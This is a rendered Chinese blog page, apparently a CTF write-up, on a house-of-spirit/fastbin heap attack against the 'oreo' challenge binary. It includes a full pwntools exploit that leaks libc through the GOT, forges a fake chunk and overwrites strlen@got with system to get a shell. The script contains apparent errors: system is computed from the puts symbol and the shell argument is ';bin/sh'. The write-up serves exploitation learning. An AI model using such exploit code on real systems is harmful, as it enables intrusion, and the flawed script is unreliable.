@@ -1,32 +1,194 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>fastbin attack | refrain的blog</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言本来是想把ctfwiki里fastbin attack的内容全部写完再写的，结果做到下一题摆了，一直逆向逆不明白，就先把这篇写了吧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastbin attack">
+<meta property="og:url" content="http://example.com/2021/10/03/fastbin-attack/index.html">
+<meta property="og:site_name" content="refrain的blog">
+<meta property="og:description" content="前言本来是想把ctfwiki里fastbin attack的内容全部写完再写的，结果做到下一题摆了，一直逆向逆不明白，就先把这篇写了吧">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-10-03T14:35:36.000Z">
+<meta property="article:modified_time" content="2021-10-22T09:50:52.081Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/10/03/fastbin-attack/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'fastbin attack',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-22 17:50:52'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="refrain的blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">refrain的blog</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">fastbin attack</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-10-03T14:35:36.000Z" title="发表于 2021-10-03 22:35:36">2021-10-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-22T09:50:52.081Z" title="更新于 2021-10-22 17:50:52">2021-10-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="fastbin attack"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本来是想把ctfwiki里fastbin attack的内容全部写完再写的，结果做到下一题摆了，一直逆向逆不明白，就先把这篇写了吧</p>
+<span id="more"></span>
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
-
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
-
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p><img src="/2021/10/03/fastbin-attack/1.png" alt="1"></p>
+<p>老样子，先执行文件看一下大概功能，大概是这6个，然后扔进32位的ida</p>
+<p>找到main函数，发现他就是执行了这个函数将他命名位menu菜单函数，这题也是典型的菜单题。</p>
+<p>功能大概添加武器，展示武器，订购武器，为你的订购留下信息，最后就是展示大概情况吧。</p>
+<p><img src="/2021/10/03/fastbin-attack/2.png" alt="2"></p>
+<p>我们将每个函数功能改成合适的名字，在ida里面拖黄按n就可以改，我们先看add函数</p>
+<p><img src="/2021/10/03/fastbin-attack/3.png" alt="3"></p>
+<p>我们一行行看，如果有一些数据命名不一样就是我用上面的方法自己改的，为了美观。</p>
+<p>首先 v1会记录上一个chunk的地址，然后新malloc一个chunk并将chunk地址赋值给原先chunk_addr这个指针</p>
+<p>然后，将上一个chunk的地址也就是v1，赋值到chunk_addr + 13*4个字节的位置，乘4时因为DWORD四个字节</p>
+<p>set0的功能暂时我也没逆明白，对这题没有太大影响。</p>
+<p>然后同理在chunk_addr+25个字节处写入56个字节的name，并且下一行在chunk_addr的起始位置写入56个字节的description，这里存在溢出。</p>
+<p>最后给add_times+1表示完成了一次add，注意add_times的位置，在bss段的804A2A4，这里后面可以用到。至此一个武器的生产完成，一个武器的struct也如上面所述，写个伪代码大概就是</p>
+<p>struct Rifle</p>
+<p>{</p>
+<p>​    char name[27]</p>
+<p>​    char description[25]</p>
+<p>​    char *last_chunk_addr</p>
+<p>}</p>
+<p>下面是show函数</p>
+<p><img src="/2021/10/03/fastbin-attack/4.png" alt="4"></p>
+<p>这个比较容易看，就是一个循环遍历通过单链表的指针把之前每个武器的name和decription打印出来</p>
+<p>另外一个比较重要的order函数</p>
+<p><img src="/2021/10/03/fastbin-attack/6.png" alt="6"></p>
+<p>还是一行行看，v1记录chunk_addr，这里依然是借助了单链表的结构遍历并且free掉，dword_804A2A0记录add的次数</p>
+<p>leave_message</p>
+<p><img src="/2021/10/03/fastbin-attack/5.png" alt="5"></p>
+<p>往0x804a2a8处写入128个字节的数据，这里也是后面可以用到。</p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>house_of_spirit，我的理解是在一个无法控制的内存区域，伪造一个chunk，然后我们可以通过程序本身提供的功能对chunk的任意读写的功能，以此来getshell</p>
+<p>这题的话，通过add里面的溢出，将last_chunk改为got表地址，并且通过show函数将got表地址打印出来，从而泄露libc地址，我们发现这题没有开启 RELRO ，意味我们可以修改 got 表地址，同时，我们发现我们可以通过leave向0x804a2a8实现任意写的能力，于是我们希望在这里构造一个fake_chunk，这里注意，0x804a2a8这里其实藏了一个指针，很多wp都没有说到，我们用add将指针改为strlen的got表地址，然后通过leave输入system的got表地址，就可以完成strlen@got表的覆写，从而getshell。</p>
+<h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><p>先贴exp</p>
+<p>from pwn import *<br>p = process(“./oreo”)<br>elf = ELF(“./oreo”)<br>libc =ELF(‘/lib32/libc.so.6’)<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’<br>def add(name,desc):<br>    p.sendline(‘1’)<br>    p.sendline(name)<br>    p.sendline(desc)<br>def show():<br>    p.sendline(‘2’)<br>def order():<br>    p.sendline(‘3’)<br>def leave(msg):<br>    p.sendline(‘4’)<br>    p.sendline(msg)<br>name = b’a’*27 +p32(elf.got[‘puts’])<br>desc = b’b’*25<br>add(name,desc)<br>show()<br>p.recvuntil(‘Description: ‘)<br>#p.recvuntil(‘Name: ‘)<br>p.recvuntil(‘Description: ‘)<br>puts_addr = u32(p.recv(4))<br>libc_base = puts_addr - libc.symbols[“puts”]<br>system_addr = libc_base + libc.symbols[“puts”]<br>#gdb.attach(p)<br>target = 0x0804A2A8<br>for i in range(0x3e):<br>    add(b’a’*27+p32(0),b’a’*25)<br>vulnname = b’a’*27 + p32(target)<br>add(vulnname,b’a’*25)<br>padding = 0x38-(0xc0-0xa8)-4<br>payload = b’a’*padding+b’\x00’*4+b’a’*4+p32(0x40)<br>leave(payload)<br>order()<br>strlen_got_addr = p32(elf.got[‘strlen’])<br>add(b’b’,strlen_got_addr)<br>leave(p32(system_addr) + b’;bin/sh’)<br>#gdb.attach(p)<br>p.interactive()</p>
+<p>这里我本地是完成getshell的交互了，但是不知道为什么输入命令行就EOF了…应该是本地libc小版本有问题，先不管了吧，比赛时候会给libc的。</p>
+<p>然后贴一下0x804a2a8的调试结果</p>
+<p><img src="/2021/10/03/fastbin-attack/7.png" alt="7"></p>
+<p><img src="/2021/10/03/fastbin-attack/8.png" alt="8"></p>
+<p>一开始自己死活不明白为什么写进去的是strlen的got表地址，再写system的地址就可以完成覆写，这里发现原来leave是通过内存中的指针进行写入的，而add是直接写入内存，所以还是要多动手实践。</p>
+<p>然后就是构造fake_chunk的细节：next_chunk的size位要不大不小，自己的size要满足fastbin</p>
+<p>多的就不说了，本wp仅用于个人反思，因为我懒所以写的可能不是很详细，下面贴两个我觉得写的不错的师傅wp，大家可以去那里学习</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/caa34a3218b8">https://www.jianshu.com/p/caa34a3218b8</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/12357237.html">https://www.cnblogs.com/luoleqi/p/12357237.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/10/03/fastbin-attack/">http://example.com/2021/10/03/fastbin-attack/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">refrain的blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/09/unsortedbin-attack/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">unsortedbin attack</div></div></a></div><div class="next-post pull-right"><a href="/2021/09/21/babyheap-0ctf-2017-wp/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">babyheap_0ctf_2017-wp</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%86%E5%90%91"><span class="toc-number">2.</span> <span class="toc-text">逆向</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">具体实现</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/10/21/heap-extend-heapcreator/" title="heap_extend heapcreator"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="heap_extend heapcreator"/></a><div class="content"><a class="title" href="/2021/10/21/heap-extend-heapcreator/" title="heap_extend heapcreator">heap_extend heapcreator</a><time datetime="2021-10-21T12:13:36.000Z" title="发表于 2021-10-21 20:13:36">2021-10-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/15/unlink/" title="unlink"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="unlink"/></a><div class="content"><a class="title" href="/2021/10/15/unlink/" title="unlink">unlink</a><time datetime="2021-10-14T16:15:59.000Z" title="发表于 2021-10-15 00:15:59">2021-10-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/09/unsortedbin-attack/" title="unsortedbin attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="unsortedbin attack"/></a><div class="content"><a class="title" href="/2021/10/09/unsortedbin-attack/" title="unsortedbin attack">unsortedbin attack</a><time datetime="2021-10-09T14:43:59.000Z" title="发表于 2021-10-09 22:43:59">2021-10-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/03/fastbin-attack/" title="fastbin attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fastbin attack"/></a><div class="content"><a class="title" href="/2021/10/03/fastbin-attack/" title="fastbin attack">fastbin attack</a><time datetime="2021-10-03T14:35:36.000Z" title="发表于 2021-10-03 22:35:36">2021-10-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/21/babyheap-0ctf-2017-wp/" title="babyheap_0ctf_2017-wp"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="babyheap_0ctf_2017-wp"/></a><div class="content"><a class="title" href="/2021/09/21/babyheap-0ctf-2017-wp/" title="babyheap_0ctf_2017-wp">babyheap_0ctf_2017-wp</a><time datetime="2021-09-21T15:45:03.000Z" title="发表于 2021-09-21 23:45:03">2021-09-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By John Doe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
